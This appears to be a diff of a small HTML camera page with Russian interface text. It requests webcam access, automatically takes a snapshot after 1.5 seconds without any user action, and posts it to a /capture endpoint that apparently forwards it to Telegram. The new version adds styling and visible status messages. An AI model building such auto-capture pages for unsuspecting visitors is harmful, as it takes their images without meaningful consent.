@@ -2,36 +2,103 @@
 <html>
 <head>
     <title>Cam</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+        #status {
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .success { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        .info { background: #e2e3e5; color: #383d41; }
+    </style>
 </head>
 <body>
-    <video id="video" width="400" height="300" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div class="container">
+        <h2>📸 Камера</h2>
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <div id="status" class="info">Запрашиваю доступ к камере...</div>
+    </div>
     
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const statusDiv = document.getElementById('status');
         
-        // Включаем камеру
+        // Запрашиваем камеру
         navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => video.srcObject = stream)
-            .catch(err => console.log(err));
+            .then(stream => {
+                video.srcObject = stream;
+                statusDiv.textContent = '✅ Камера работает, делаю снимок...';
+                statusDiv.className = 'success';
+            })
+            .catch(err => {
+                statusDiv.textContent = '❌ Ошибка: нет доступа к камере';
+                statusDiv.className = 'error';
+                console.log(err);
+            });
         
-        // Делаем снимок через секунду
+        // Когда видео начнет играть
         video.addEventListener('play', () => {
             setTimeout(() => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                // Отправляем фото
-                fetch('/capture', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        photo: canvas.toDataURL('image/jpeg')
+                try {
+                    // Делаем снимок
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    // Конвертируем в base64
+                    const photo = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    statusDiv.textContent = '📤 Отправляю фото...';
+                    
+                    // Отправляем на сервер
+                    fetch('/capture', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ photo: photo })
                     })
-                });
-            }, 1000);
+                    .then(response => {
+                        if (response.ok) {
+                            statusDiv.textContent = '✅ Фото отправлено в Telegram!';
+                            statusDiv.className = 'success';
+                        } else {
+                            statusDiv.textContent = '❌ Ошибка сервера';
+                            statusDiv.className = 'error';
+                        }
+                    })
+                    .catch(error => {
+                        statusDiv.textContent = '❌ Ошибка отправки';
+                        statusDiv.className = 'error';
+                        console.log(error);
+                    });
+                    
+                } catch (e) {
+                    statusDiv.textContent = '❌ Ошибка при съемке';
+                    statusDiv.className = 'error';
+                }
+            }, 1500);
         });
     </script>
 </body>
